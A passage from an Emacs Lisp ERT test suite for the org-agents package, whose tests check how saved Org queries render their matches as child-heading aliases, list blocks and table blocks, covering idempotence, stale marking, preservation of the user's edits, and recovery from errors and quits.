      (org-agents--render-children agent (org-agents--collect agent))
      (let ((rendered (org-agents-test--alias-line "Fix widget")))
        ;; Retitle the alias, leaving its body the drawer it already was.
        ;; The link goes with the title, so the alias no longer names any
        ;; target either -- and is still reaped, because pristine is
        ;; answered before a target is looked for at all.
        (goto-char (point-min))
        (search-forward "Fix widget")
        (org-back-to-heading t)
        (org-edit-headline "my own words about it")
        (should (null (org-agents--alias-target (org-get-heading t t t nil))))
        (goto-char (point-min))
        (should (= 1 (org-agents--render-children
                      agent (org-agents--collect agent))))
        (let ((lines (split-string (buffer-string) "\n")))
          (should-not (cl-find-if (lambda (l) (string-match-p "my own words" l))
                                  lines))
          (should (= 1 (cl-count-if (lambda (l) (string-match-p "Fix widget" l))
                                    lines))))
        ;; And what came back is the alias the first render wrote.
        (should (equal rendered (org-agents-test--alias-line "Fix widget")))))))

(ert-deftest org-agents-test-children-stale-marker ()
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (let ((agent (org-agents--read-agent)))
        (org-agents--render-children agent (org-agents--collect agent))
        (goto-char (point-max))
        (insert "*** keep me\n")
        ;; Now render with no matches: annotated alias is kept, marked stale.
        (goto-char (point-min))
        (org-agents--render-children agent nil)
        (should (string-match-p "(stale)" (buffer-string)))
        (should (string-match-p "keep me" (buffer-string)))))))

(ert-deftest org-agents-test-children-unstale-when-the-match-returns ()
  "The mark answers for this update, not for an older one."
  (org-agents-test--in-agent
    (let ((agent (org-agents--read-agent)))
      (org-agents--render-children agent (org-agents--collect agent))
      (goto-char (point-max))
      (insert "*** pinned\n")
      (org-agents--render-children agent nil)
      (should (string-match-p "(stale)" (buffer-string)))
      (org-agents--render-children agent (org-agents--collect agent))
      (should-not (string-match-p "(stale)" (buffer-string)))
      ;; And the returning match is still not duplicated.
      (should (= 1 (cl-count-if (lambda (l) (string-match-p "Fix widget" l))
                                (split-string (buffer-string) "\n")))))))

(ert-deftest org-agents-test-children-stale-preserves-comment-keyword ()
  "Marking an alias stale must not quietly uncomment it.
`org-edit-headline' replaces the heading's title group, and a COMMENT
keyword sits inside that group, so a title read without the keyword
would drop it -- uncommenting, on the user's behalf, an alias they
commented out."
  (org-agents-test--in-agent
    (let ((agent (org-agents--read-agent)))
      (org-agents--render-children agent (org-agents--collect agent))
      ;; Comment the alias out and annotate it, so this update keeps it.
      (goto-char (point-min))
      (search-forward "Fix widget")
      (org-back-to-heading t)
      (org-toggle-comment)
      (org-end-of-subtree t t)
      (insert "*** mine\n")
      (goto-char (point-min))
      (org-agents--render-children agent nil)
      (let ((line (org-agents-test--alias-line "Fix widget")))
        (should (string-prefix-p "** COMMENT " line))
        (should (string-suffix-p " (stale)" line))
        ;; And the keyword survives the round trip back to unstale.
        (goto-char (point-min))
        (org-agents--render-children agent (org-agents--collect agent))
        (let ((back (org-agents-test--alias-line "Fix widget")))
          (should (string-prefix-p "** COMMENT " back))
          (should-not (string-suffix-p " (stale)" back)))))))

(ert-deftest org-agents-test-children-idempotent ()
  "A second update over the same matches leaves the buffer as it was."
  (org-agents-test--in-agent
    (let ((agent (org-agents--read-agent)))
      (org-agents--render-children agent (org-agents--collect agent))
      (let ((rendered (buffer-string)))
        (org-agents--render-children agent (org-agents--collect agent))
        (should (equal rendered (buffer-string)))))))

(ert-deftest org-agents-test-children-mixed-children ()
  "Children of every kind at once: what is reaped, and what is left.
Deleting or retitling one child moves every position after it, so the
regions are collected before the first edit and acted on back to front."
  (org-agents-test--in-agent
    (let ((agent (plist-put (org-agents--read-agent)
                            :query '(property "NEXT_REVIEW"))))
      (should (= 2 (org-agents--render-children
                    agent (org-agents--collect agent))))
      ;; Annotate the first alias, and add two children of the user's
      ;; own, one of them carrying a property drawer of its own.
      (goto-char (point-min))
      (search-forward "Fix widget")
      (org-end-of-subtree t t)
      (insert "*** annotated by hand\n")
      (goto-char (point-max))
      (insert "** hand written\n"
              "** with a drawer\n:PROPERTIES:\n:NOTE: mine\n:END:\n")
      (org-agents--render-children agent (org-agents--collect agent))
      (let ((text (buffer-string)))
        (should (string-match-p "annotated by hand" text))
        (should (string-match-p "hand written" text))
        (should (string-match-p ":NOTE: mine" text))
        (should-not (string-match-p "(stale)" text))
        (dolist (title '("Fix widget" "Old thing"))
          (should (= 1 (cl-count-if (lambda (l) (string-match-p title l))
                                    (split-string text "\n")))))))))

(ert-deftest org-agents-test-children-spares-a-child-whose-match-is-not-t ()
  "Only `:AGENT_MATCH: t' exactly authorizes reaping a child.
`org-agents--alias-regions' compares the value with `equal', because a
generated alias is the one text this package deletes that it did not
write, and `AGENT_MATCH' arrives as text out of a file like every other
agent property.  A child saying anything else -- `nil', the same word in
another case, a property line with nothing after it -- is the user's, and
is neither deleted nor retitled."
  (org-agents-test--in-agent
    (let ((agent (org-agents--read-agent))
          (mine '("nil" "yes" "T" "true")))
      ;; A generated alias first, so the reaping loop demonstrably runs and
      ;; the children below are spared by their value rather than by a
      ;; loop that found nothing to do.
      (should (= 1 (org-agents--render-children
                    agent (org-agents--collect agent))))
      (goto-char (point-max))
      (dolist (value mine)
        (insert "** Mine " value "\n:PROPERTIES:\n:AGENT_MATCH: " value
                "\n:END:\nwhat I wrote under " value "\n"))
      ;; And one whose property line is written but says nothing, which
      ;; `org-entry-get' answers with the empty string.
      (insert "** Mine blank\n:PROPERTIES:\n:AGENT_MATCH:\n:END:\n")
      (let ((before (buffer-string)))
        (goto-char (point-min))
        (should (= 0 (org-agents--render-children agent nil)))
        (let ((after (buffer-string)))
          ;; The alias was reaped ...
          (should-not (string-match-p "Fix widget" after))
          ;; ... and from the first of the user's children to the end of
          ;; the buffer nothing changed at all: no deletion, no stale mark.
          (should-not (string-match-p "(stale)" after))
          (should (equal (substring before (string-match "\\*\\* Mine nil"
                                                         before))
                         (substring after (string-match "\\*\\* Mine nil"
                                                        after)))))))))

(ert-deftest org-agents-test-children-render-with-the-element-cache-on ()
  "A render agrees with itself whether or not `org-element-use-cache' is on.
The cache is on in ordinary use and off in every other fixture here, and
every edit `org-agents--render-children' makes is followed by an element
read -- among them the `org-ql-select' of the render after it, which is
where the cache is actually consulted: the renderer's own reads go
through `org-back-to-heading', `org-end-of-subtree' and
`org-property-start-re', and none of those touch `org-element' at all.

Both of the paths that edit are taken: the second render deletes the
pristine alias the first wrote and writes it again, and the third finds
that alias annotated and retitles it in place instead.  The shape of the
result is pinned as well as the agreement, because two passes wrong in
the same way would agree with each other."
  (let (texts)
    (dolist (cache (list nil (default-value 'org-element-use-cache)))
      (org-agents-test--with-corpus
        (let ((org-element-use-cache cache))
          (with-current-buffer (find-file-noselect agent-file)
            (goto-char (point-min))
            ;; Not a vacuous pass: where the cache is asked for, it is
            ;; really on, so what follows reads the buffer through it.
            (org-element-at-point)
            (should (eq (and cache t) (and (org-element--cache-active-p) t)))
            (let ((agent (org-agents--read-agent)))
              ;; 1: insert.
              (org-agents--render-children agent (org-agents--collect agent))
              ;; 2: the alias is pristine, so it is deleted and rewritten.
              (goto-char (point-min))
              (org-agents--render-children agent (org-agents--collect agent))
              ;; 3: annotated, so it is kept and retitled in place.
              (goto-char (point-max))
              (insert "*** annotated by hand\n")
              (goto-char (point-min))
              (org-agents--render-children agent (org-agents--collect agent))
              ;; Each pass gets its own corpus, whose name the agent's
              ;; `:AGENT_SCOPE:' spells out; the outline around it is what
              ;; the two passes have to agree on.
              (push (replace-regexp-in-string (regexp-quote dir) "<corpus>"
                                              (buffer-string))
                    texts))))))
    (should (= 2 (length texts)))
    ;; Both passes agree, and both are right: two passes that had gone
    ;; wrong in the same way would agree too.
    (should (equal (car texts) (cadr texts)))
    (dolist (text texts)
      (should (= 1 (cl-count-if (lambda (l) (string-match-p "Fix widget" l))
                                (split-string text "\n"))))
      ;; The annotation is still the alias's own child, which is what
      ;; pinned the alias in the first place.
      (should (string-match-p
               (concat "^\\*\\* \\[\\[id:[^\n]*Fix widget[^\n]*\n"
                       ":PROPERTIES:\n:AGENT_MATCH: t\n:END:\n"
                       "\\*\\*\\* annotated by hand$")
               text)))))

(ert-deftest org-agents-test-children-spares-a-sibling-agent ()
  "Rendering one agent must not move the next agent's anchor.
`org-agents-update-buffer' reads the agents of a buffer before it
renders any of them.  A marker sitting where the first agent's subtree
ends does not move when text is inserted at that very position, so
appending there would leave the second agent anchored on the first
agent's new alias instead of on its own heading."
  (org-agents-test--with-corpus
    (with-temp-file agent-file
      (insert "* First agent\n:PROPERTIES:\n"
              ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
              ":AGENT_SCOPE: (\"" a "\")\n:END:\n"
              "* Second agent\n:PROPERTIES:\n:AGENT_QUERY: (todo)\n:END:\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (let* ((first-agent (org-agents--read-agent))
             (second-agent (progn (goto-char (point-min))
                                  (search-forward "Second agent")
                                  (org-agents--read-agent))))
        (should (= 1 (org-agents--render-children
                      first-agent (org-agents--collect first-agent))))
        (should (equal "Second agent"
                       (org-with-point-at (plist-get second-agent :marker)
                         (org-get-heading t t t t))))
        ;; And the alias landed under the first agent, not the second.
        (should (org-with-point-at (plist-get first-agent :marker)
                  (< (point)
                     (save-excursion
                       (goto-char (point-min))
                       (search-forward "Fix widget"))
                     (marker-position (plist-get second-agent :marker)))))))))

(ert-deftest org-agents-test-children-spares-a-sibling-agent-on-a-second-render ()
  "The delete path must spare the next agent's anchor as the insert does.
A first render exercises only the insert.  The second runs the
back-to-front `delete-region' loop over the pristine alias the first one
wrote, with the second agent's marker live throughout -- which is where a
stranded marker showed up before.  A marker a deletion moved would leave
the second agent reading the first agent's entry."
  (org-agents-test--with-corpus
    (with-temp-file agent-file
      (insert "* First agent\n:PROPERTIES:\n"
              ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
              ":AGENT_SCOPE: (\"" a "\")\n:END:\n"
              "* Second agent\n:PROPERTIES:\n:AGENT_QUERY: (todo)\n:END:\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (let* ((first-agent (org-agents--read-agent))
             (second-agent (progn (goto-char (point-min))
                                  (search-forward "Second agent")
                                  (org-agents--read-agent))))
        (should (= 1 (org-agents--render-children
                      first-agent (org-agents--collect first-agent))))
        (let ((once (buffer-string)))
          (should (= 1 (org-agents--render-children
                        first-agent (org-agents--collect first-agent))))
          ;; Idempotent with a sibling present, not merely without one.
          (should (equal once (buffer-string))))
        (should (= 1 (cl-count-if (lambda (l) (string-match-p "Fix widget" l))
                                  (split-string (buffer-string) "\n"))))
        ;; The second agent's marker still names its own headline, so its
        ;; query is still read out of its own drawer.
        (should (equal "Second agent"
                       (org-with-point-at (plist-get second-agent :marker)
                         (org-get-heading t t t t))))
        (should (equal '(todo)
                       (org-with-point-at (plist-get second-agent :marker)
                         (plist-get (org-agents--read-agent) :query))))))))

(ert-deftest org-agents-test-children-format-suffix ()
  "`:AGENT_FORMAT:' names properties to show after the link."
  (org-agents-test--in-agent
    (org-entry-put nil "AGENT_FORMAT" "NEXT_REVIEW")
    (goto-char (point-min))
    (let ((agent (org-agents--read-agent)))
      (org-agents--render-children agent (org-agents--collect agent))
      ;; One space, not two: the suffix reads as part of the heading
      ;; line rather than as a column aligned away from it.
      (should (string-suffix-p "]] [2020-01-01 Wed]"
                               (org-agents-test--alias-line "Fix widget")))
      (should-not (string-suffix-p "]]  [2020-01-01 Wed]"
                                   (org-agents-test--alias-line "Fix widget"))))
    ;; A property the match does not carry adds nothing to the heading,
    ;; not even the space that would have separated it.
    (goto-char (point-min))
    (org-entry-put nil "AGENT_FORMAT" "NO_SUCH_PROPERTY")
    (goto-char (point-min))
    (let ((agent (org-agents--read-agent)))
      (org-agents--render-children agent (org-agents--collect agent))
      (should (string-suffix-p "]]" (org-agents-test--alias-line
                                     "Fix widget"))))))

(ert-deftest org-agents-test-children-unresolved-match-renders-plain ()
  "A match that cannot be located still gets an alias, marked `(?)'."
  (org-agents-test--in-agent
    (let ((agent (org-agents--read-agent))
          (ghost (org-element-create
                  'headline (list :raw-value "Vanished entry"
                                  :org-hd-marker (make-marker)))))
      (should (= 1 (org-agents--render-children agent (list ghost))))
      (should (string-match-p (regexp-quote "** Vanished entry (?)")
                              (buffer-string)))
      ;; It is a generated alias like any other, so the next update
      ;; reaps it even though it links to nothing.
      (org-agents--render-children agent nil)
      (should-not (string-match-p "Vanished" (buffer-string))))))

(ert-deftest org-agents-test-render-children-refuses-a-bad-anchor ()
  "A render that deletes text must know where it is writing.
An agent read from a file-level property drawer has no subtree at all,
and `org-back-to-heading' would signal a plain error over it, which
`org-agents-update-all' cannot tell from a bug in this package."
  (org-agents-test--in-agent
    (should-error (org-agents--render-children
                   (plist-put (org-agents--read-agent) :marker nil) nil)
                  :type 'user-error))
  (org-agents-test--with-corpus
    (with-temp-file agent-file
      (insert ":PROPERTIES:\n:AGENT_QUERY: (todo)\n:END:\n* Not an agent\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (let ((agent (org-agents--read-agent))
            (before (buffer-string)))
        (should-error (org-agents--render-children agent nil) :type 'user-error)
        (should (equal before (buffer-string)))))))

;;;; Idempotence over the text around an agent

;; One property, asserted over all three views together rather than split
;; between the children and dynamic-block sections: rendering an agent twice
;; leaves the buffer exactly as the first render left it.  What breaks it is
;; never the render itself but the text AROUND the agent -- a blank line
;; between its subtree and the next heading, which is how Org files are
;; ordinarily written and which no test above has.

(defmacro org-agents-test--with-neighbour-agent (props separator &rest body)
  "Run BODY in a buffer holding one agent with a heading after it.
PROPS is extra property-drawer text for the agent.  SEPARATOR is what
stands between the agent's drawer and that heading: \"\\n\" for the blank
line ordinary Org style puts between subtrees, or \"\" for none.

The window is made to show the buffer, because a block view is written
through `org-update-dblock', which indents in the selected window's
buffer."
  (declare (indent 2))
  `(org-agents-test--with-corpus
     (with-temp-file agent-file
       (insert "* Review agent\n:PROPERTIES:\n"
               ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
               ":AGENT_SCOPE: (\"" a "\")\n" ,props ":END:\n"
               ,separator
               "* A following heading\n"
               "Body text.\n"))
     (with-current-buffer (find-file-noselect agent-file)
       (set-window-buffer (selected-window) (current-buffer))
       ,@body)))

(defun org-agents-test--render-twice ()
  "Update this buffer's agents twice; return the text after each render.
The `:AGENT_MATCHED:' stamps are masked out of both, because they are
written afresh by each render and carry the time it ran: comparing them
would report every second render as a change, or -- worse, since the stamp
has minute resolution -- report one as unchanged only for as long as the
two renders fall in the same minute."
  (cl-flet ((text ()
              ;; Without properties: a table view is font-locked, and a
              ;; failure would otherwise print every face in the block.
              (org-agents--mask-matched
               (buffer-substring-no-properties (point-min) (point-max)))))
    (org-agents-update-buffer)
    (let ((first (text)))
      (org-agents-update-buffer)
      (cons first (text)))))

(ert-deftest org-agents-test-render-twice-keeps-a-blank-line-children ()
  "A blank line between an agent and the next heading is the user's.
The children view deletes each pristine alias before writing it again, and
the region it deletes must be the alias -- not the alias and whatever
blank line happened to follow it.  Rendered twice, an agent written in
ordinary Org style must leave the file exactly as the first render did."
  (org-agents-test--with-neighbour-agent "" "\n"
    (pcase-let ((`(,first . ,second) (org-agents-test--render-twice)))
      ;; The alias was written, so this is idempotence and not inertia.
      (should (string-match-p "^\\*\\* \\[\\[id:11111111-" first))
      ;; The blank line survived the first render ...
      (should (string-match-p ":AGENT_MATCH: t\n:END:\n\n\\* A following" first))
      ;; ... and the second.
      (should (string-match-p ":AGENT_MATCH: t\n:END:\n\n\\* A following" second))
      (should (equal first second)))))

(ert-deftest org-agents-test-render-twice-adds-no-blank-line-children ()
  "Nor may a render INVENT a blank line where the user wrote none.
The other direction of the same rule: what separates an agent from the
next heading is the user's business, and an update neither eats it nor
supplies it."
  (org-agents-test--with-neighbour-agent "" ""
    (pcase-let ((`(,first . ,second) (org-agents-test--render-twice)))
      (should (string-match-p "^\\*\\* \\[\\[id:11111111-" first))
      (should (string-match-p ":AGENT_MATCH: t\n:END:\n\\* A following" first))
      (should (string-match-p ":AGENT_MATCH: t\n:END:\n\\* A following" second))
      (should (equal first second)))))

(ert-deftest org-agents-test-render-twice-keeps-two-blank-lines-children ()
  "Two blank lines are two blank lines, and the alias goes above both.
`org-end-of-subtree' without TO-HEADING stops in a place that keeps ONE
blank line before the next heading, which in a run of two is the middle:
an alias inserted there would land between them, and the run would be
rewritten on every render."
  (org-agents-test--with-neighbour-agent "" "\n\n"
    (pcase-let ((`(,first . ,second) (org-agents-test--render-twice)))
      (should (string-match-p ":AGENT_MATCH: t\n:END:\n\n\n\\* A following"
                              first))
      (should (string-match-p ":AGENT_MATCH: t\n:END:\n\n\n\\* A following"
                              second))
      (should (equal first second)))))

(ert-deftest org-agents-test-render-twice-adds-no-blank-line-list ()
  "A block view invents no separator either.
`org-agents--goto-block' opens the block against the drawer, so an agent
written without a blank line after it does not acquire one."
  (org-agents-test--with-neighbour-agent ":AGENT_VIEW: list\n" ""
    (pcase-let ((`(,first . ,second) (org-agents-test--render-twice)))
      (should (string-match-p "^- \\[\\[id:11111111-" first))
      (should (string-match-p "#\\+END:\n\\* A following" first))
      (should (string-match-p "#\\+END:\n\\* A following" second))
      (should (equal first second)))))

(ert-deftest org-agents-test-render-twice-keeps-a-blank-line-list ()
  "The same, for a list view: the block is opened, then rewritten.
A dynamic block's body is deleted and written again on every update, so a
block view has its own chance to consume the line after it."
  (org-agents-test--with-neighbour-agent ":AGENT_VIEW: list\n" "\n"
    (pcase-let ((`(,first . ,second) (org-agents-test--render-twice)))
      (should (string-match-p "^- \\[\\[id:11111111-" first))
      (should (string-match-p "#\\+END:\n\n\\* A following" first))
      (should (string-match-p "#\\+END:\n\n\\* A following" second))
      (should (equal first second)))))

(ert-deftest org-agents-test-render-twice-keeps-a-blank-line-table ()
  "The same again for a table, whose body is realigned as well as written."
  (org-agents-test--with-neighbour-agent
      ":AGENT_VIEW: table\n:AGENT_COLUMNS: ITEM_BY_ID NEXT_REVIEW\n" "\n"
    (pcase-let ((`(,first . ,second) (org-agents-test--render-twice)))
      (should (string-match-p "^| \\[\\[id:11111111-" first))
      (should (string-match-p "#\\+END:\n\n\\* A following" first))
      (should (string-match-p "#\\+END:\n\n\\* A following" second))
      (should (equal first second)))))

;;;; Dynamic block

(defmacro org-agents-test--with-dblock-agent (view extra &rest body)
  "Run BODY at an empty `org-agents' block under an agent rendering VIEW.
EXTRA is appended to the agent's property drawer, as text.  Point is at
the block's `#+BEGIN:' line, where `org-dblock-update' expects it, and
the corpus is the one `org-agents-test--with-corpus' provides."
  (declare (indent 2))
  `(org-agents-test--with-corpus
     (with-current-buffer (find-file-noselect agent-file)
       (goto-char (point-max))
       (insert "\n* Block agent\n:PROPERTIES:\n"
               ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
               ":AGENT_SCOPE: (\"" a "\" \"" b "\")\n"
               ":AGENT_VIEW: " ,view "\n" ,extra ":END:\n\n"
               "#+BEGIN: org-agents\n#+END:\n")
       (re-search-backward "#\\+BEGIN: org-agents")
       ,@body)))

(defun org-agents-test--block-bodies ()
  "The body of every `org-agents' block in the buffer, in buffer order.
For the multi-block tests, which have to say which body is which: a
`cl-count-if' over the whole buffer cannot tell a block that rendered
from one that received a copy of its neighbour."
  (let (out)
    (save-excursion
      (goto-char (point-min))
      (while (re-search-forward org-dblock-start-re nil t)
        (when (equal (match-string 1) "org-agents")
          (let ((beg (progn (forward-line 1) (point))))
            (when (re-search-forward org-dblock-end-re nil t)
              (push (buffer-substring-no-properties beg (match-beginning 0))
                    out))))))
    (nreverse out)))

(defun org-agents-test--masked-buffer-text ()
  "The buffer's text with `:AGENT_MATCHED:' stamps masked out.
The stamp holds the time of the render, so two renders of an unchanged
agent differ there and nowhere else.  Masking it is how the save path's
own byte-identity check is written -- see `org-agents--mask-matched' --
so an idempotence assertion here is the same comparison the save makes."
  (org-agents--mask-matched (buffer-substring-no-properties
                             (point-min) (point-max))))

(defun org-agents-test--dblock-body ()
  "The body of the `org-agents' block point is in, as a string."
  (save-excursion
    (goto-char (point-min))
    (re-search-forward "#\\+BEGIN: org-agents.*\n")
    (buffer-substring-no-properties
     (point) (progn (re-search-forward "^[ \t]*#\\+END:") (match-beginning 0)))))

(ert-deftest org-agents-test-dblock-list ()
  (org-agents-test--with-dblock-agent "list" ":AGENT_FORMAT: NEXT_REVIEW\n"
    (org-dblock-update)
    ;; One space between the link and the suffix, as the children view
    ;; writes it: the suffix reads as part of the line rather than as a
    ;; column aligned away from it.  The regexp discriminates -- two
    ;; spaces in the buffer leave the second unmatched before `\['.
    (should (string-match-p "^- \\[\\[id:11111111-.*Fix widget\\]\\] \\[2020-01-01 Wed\\]"
                            (buffer-string)))
    ;; The count the update commands report is this render's, and only a
    ;; render that succeeded has one.
    (should (= 1 org-agents--last-count))))

(ert-deftest org-agents-test-dblock-table ()
  (org-agents-test--with-dblock-agent "table"
      ":AGENT_COLUMNS: ITEM_BY_ID NEXT_REVIEW\n"
    (org-dblock-update)
    (let ((s (buffer-string)))
      (should (string-match-p "| *ITEM_BY_ID *| *NEXT_REVIEW *|" s))
      (should (string-match-p "Fix widget" s))
      ;; The table is aligned in the buffer, so the rule written `|-|'
      ;; has been widened to the columns it separates.
      (should (string-match-p "|---" s))
      ;; And the block still ends where it did: aligning the table left
      ;; the newline that separates its last row from `#+END:'.
      (should (string-suffix-p "|\n" (org-agents-test--dblock-body)))
      (should (= 1 org-agents--last-count)))))

(ert-deftest org-agents-test-dblock-alignment-failure-keeps-the-table ()
  "An alignment that fails leaves the table unaligned, not the run broken.
The rows are in the buffer before `org-table-align' is called, so the
block is never left empty by one -- but escaping, the error would reach
`org-update-dblock' as this render's failure and stop
`org-agents-update-all' at the agent it happened in."
  (org-agents-test--with-dblock-agent "table" ":AGENT_COLUMNS: ITEM_BY_ID\n"
    (cl-letf (((symbol-function 'org-table-align)
               (lambda (&rest _) (error "alignment boom"))))
      (org-dblock-update))
    ;; The render counted, so it did not fail ...
    (should (= 1 org-agents--last-count))
    (should (null org-agents--last-error))
    ;; ... and the rows are there, merely unaligned: the rule is still the
    ;; `|-|' the writer wrote rather than the widened one.
    (let ((body (org-agents-test--dblock-body)))
      (should (string-match-p "Fix widget" body))
      (should (string-match-p "^|-|$" body)))))

(ert-deftest org-agents-test-dblock-error-restores-content ()
  "A failed render puts back the body Org deleted before calling it.
`org-prepare-dblock' empties the block first, so a writer that let a
failure out would leave nothing behind -- and under
`org-update-all-dblocks', which reports the error and moves on, nothing
would put it back."
  (org-agents-test--with-dblock-agent "list" ""
    ;; Seed the block with prior content, then force a failure.
    (org-dblock-update)
    (let ((before (buffer-string)))
      (cl-letf (((symbol-function 'org-agents--collect)
                 (lambda (&rest _) (error "boom"))))
        (org-dblock-update)
        (should (equal (buffer-string) before))
        ;; A failed render reports no count at all, rather than the count
        ;; of the render before it.
        (should (null org-agents--last-count))
        ;; The same holds on the other path into the writer.
        (org-update-all-dblocks)
        (should (equal (buffer-string) before))
        (should (null org-agents--last-count))))))

(ert-deftest org-agents-test-dblock-quit-restores-content ()
  "C-g is not an error, and would otherwise leave the block empty.
`quit' is no subtype of `error', so a handler for one does not catch the
other, and `org-map-dblocks' catches only errors either -- nothing would
put the body back.  The interrupt still interrupts: the body goes back
first, and the quit is signaled again."
  (org-agents-test--with-dblock-agent "list" ""
    (org-dblock-update)
    (let ((before (buffer-string)))
      (cl-letf (((symbol-function 'org-agents--collect)
                 (lambda (&rest _) (signal 'quit nil))))
        (let ((interrupted nil))
          (condition-case nil (org-dblock-update) (quit (setq interrupted t)))
          (should interrupted))
        (should (equal (buffer-string) before))
        (should (null org-agents--last-count))))))

(ert-deftest org-agents-test-dblock-indented-restore-round-trips ()
  "An indented block that fails a render is left byte-exactly as it was.
`org-update-dblock' indents every body line once the writer returns, so
a body put back with the indentation it was found with would gain
another, once per failed render.  A quit is the other way round: the
writer never returns, nothing indents anything, and the body has to go
back exactly as it was found."
  (org-agents-test--with-dblock-agent "list" ""
    ;; An indented block, as one written under a list item would be.
    (insert "  ")
    (forward-line 1)
    (insert "  ")
    (forward-line -1)
    ;; `org-update-dblock' indents in the selected window's buffer, which
    ;; in batch is not this one unless it is put there.
    (set-window-buffer (selected-window) (current-buffer))
    (org-dblock-update)
    (let ((before (buffer-string)))
      (should (string-match-p "^  - \\[\\[id:" before))
      (cl-letf (((symbol-function 'org-agents--collect)
                 (lambda (&rest _) (error "boom"))))
        (org-dblock-update)
        (should (equal (buffer-string) before))
        ;; Twice, because drift accumulates: one failure could pass by
        ;; luck where two cannot.
        (org-dblock-update)
        (should (equal (buffer-string) before)))
      (cl-letf (((symbol-function 'org-agents--collect)
                 (lambda (&rest _) (signal 'quit nil))))
        (condition-case nil (org-dblock-update) (quit nil))
        (should (equal (buffer-string) before))))))

(ert-deftest org-agents-test-dblock-inline-nil-clears-a-property ()
  "An inline nil overrides the entry's property; an absent one inherits.
`plist-member', not `plist-get': a block that writes `:limit nil' asks
for no limit, which is not what a block saying nothing about one asks."
  (org-agents-test--with-dblock-agent "list" ":AGENT_LIMIT: 1\n"
    (write-region "* TODO Second item\n:PROPERTIES:\n:NEXT_REVIEW: [2020-02-02 Sun]\n:END:\n"
                  nil a t 'quiet)
    ;; Inherited: the agent's limit of one.
    (org-dblock-update)
    (should (= 1 org-agents--last-count))
    ;; Cleared: the block asks for no limit at all.
    (end-of-line)
    (insert " :limit nil")
    (beginning-of-line)
    (org-dblock-update)
    (should (= 2 org-agents--last-count))))

(ert-deftest org-agents-test-dblock-refuses-a-nil-scope-or-view ()
  "A block may clear a property that has a `none' of its own, and no other.
`:sort', `:limit', `:columns' and `:format' each have one.  A scope does
not: nil resolves to no files at all, so the block would render empty and
read exactly like a query that matched nothing.  Neither does a view: nil
is not `table', so it would quietly degrade to a list and read out of
`org-agents--check-row-sort' as \"the view is `nil'\"."
  (org-agents-test--with-dblock-agent "list" ":AGENT_LIMIT: 1\n"
    (should-error (org-agents--dblock-agent '(:name "org-agents" :scope nil))
                  :type 'user-error)
    (should-error (org-agents--dblock-agent '(:name "org-agents" :view nil))
                  :type 'user-error)
    (dolist (key '(:sort :limit :columns :format))
      (should-not (plist-get (org-agents--dblock-agent
                              (list :name "org-agents" key nil))
                             key)))))

(ert-deftest org-agents-test-dblock-refuses-a-mistyped-parameter ()
  "A block's parameters are Lisp, so they can be of the wrong type.
The drawer could only ever have said `table'; a block can say
`:view \"table\"', which is not the symbol and would quietly render a
list.  `:limit \"5\"' is the same slip read the other way, and reaches
`take' as a wrong type where the writer reports a render that failed
rather than a parameter that is wrong."
  (org-agents-test--with-dblock-agent "list" ""
    (dolist (bad '((:view "table") (:view table-ish) (:view 3)
                   (:limit "5") (:limit 2.5) (:limit -1)
                   (:columns ITEM_BY_ID) (:format 7)))
      (let ((err (should-error (org-agents--dblock-agent
                                (append '(:name "org-agents") bad))
                               :type 'user-error)))
        (should (string-match-p (regexp-quote (symbol-name (car bad)))
                                (error-message-string err)))))
    ;; The well-typed spellings of the same parameters still pass.
    (dolist (good '((:view table) (:view children) (:limit 5) (:limit 0)
                    (:columns "ITEM_BY_ID NEXT_REVIEW") (:format "NEXT_REVIEW")))
      (should (equal (cadr good)
                     (plist-get (org-agents--dblock-agent
                                 (append '(:name "org-agents") good))
                                (car good)))))))

(ert-deftest org-agents-test-dblock-nil-scope-empties-nothing ()
  "A refused parameter leaves the block as it was, rather than emptying it.
An empty body and a count of none are what a query that matched nothing
looks like, and a scope that names no files must not be read as one."
  (org-agents-test--with-dblock-agent "list" ""
    (org-dblock-update)
    (should (= 1 org-agents--last-count))
    (end-of-line)
    (insert " :scope nil")
    (beginning-of-line)
    (let ((before (buffer-string)))
      (org-dblock-update)
      (should (equal before (buffer-string)))
      (should (null org-agents--last-count)))))

(ert-deftest org-agents-test-dblock-table-without-links-builds-none ()
  "A table with no link column builds no link, and registers no ID.
`org-agents--link-to' registers the id location of every match it links
so the link resolves without a rescan; built for a column that is not
there, it would write the corpus into `org-id-locations' on behalf of
links nothing holds."
  (org-agents-test--with-dblock-agent "table" ":AGENT_COLUMNS: NEXT_REVIEW\n"
    (org-dblock-update)
    (should (string-match-p "| *NEXT_REVIEW *|" (buffer-string)))
    (should (string-match-p "2020-01-01" (buffer-string)))
    (should (= 0 (hash-table-count org-id-locations)))))

(ert-deftest org-agents-test-row-sort-needs-a-table ()
  "A row sort names table rows, and a list or the children view has none.
org-ql refuses the form as well, so left alone the sort would order
nothing at all, and say nothing about it."
  (org-agents-test--with-dblock-agent "list" ":AGENT_SORT: (ts-column 2)\n"
    (org-dblock-update)
    ;; The block reports the misconfiguration and keeps the body it had.
    (should (null org-agents--last-count))
    (should (equal "\n" (org-agents-test--dblock-body))))
  (org-agents-test--in-agent
    (org-entry-put nil "AGENT_SORT" "(column 1)")
    (goto-char (point-min))
    (let ((agent (org-agents--read-agent)))
      (should-error (org-agents--render-children agent nil) :type 'user-error))))

(ert-deftest org-agents-test-dblock-no-matches-counts-none ()
  "A render that matched nothing empties the block and counts none.
Zero is not nil: a nil count is how a failed render is recognized, and a
query that matched nothing has not failed."
  (org-agents-test--with-dblock-agent "list" ""
    (goto-char (point-min))
    (search-forward "* Block agent")
    (org-entry-put nil "AGENT_QUERY" "(heading \"no such heading\")")
    (re-search-forward "#\\+BEGIN: org-agents")
    (beginning-of-line)
    (org-dblock-update)
    (should (equal "\n" (org-agents-test--dblock-body)))
    (should (= 0 org-agents--last-count))))

(ert-deftest org-agents-test-dblock-table-escapes-cell-separator ()
  "A title holding `|' may not break the row it is rendered in."
  (org-agents-test--with-dblock-agent "table"
      ":AGENT_COLUMNS: ITEM_BY_ID NEXT_REVIEW\n"
